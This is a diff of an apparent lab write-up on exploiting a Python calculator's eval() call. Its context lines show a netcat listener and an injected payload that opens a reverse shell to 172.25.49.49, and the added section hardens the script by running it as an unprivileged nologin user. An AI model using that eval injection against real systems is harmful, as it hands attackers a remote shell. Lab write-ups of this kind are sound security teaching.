@@ -136,3 +136,18 @@ Exploit .eval()
 nc -lvnp 12345
 __import__('os').system('nc 172.25.49.49 12345 -e /bin/bash')
 ```
+## 4. Harden
+```
+[gnathan@localhost /]$ ps aux | grep calc.py
+root       78851  0.2  0.4  10904  8576 ?        Ss   18:25   0:00 /usr/bin/python3 /opt/calc.py
+```
+
+```
+[gnathan@localhost /]$ sudo sudo useradd -r -s /usr/sbin/nologin -M calculatrice
+```
+
+```
+-rwx------. 1 calculatrice calculatrice 660 Mar 23 17:24 /opt/calc.py
+```
+
+
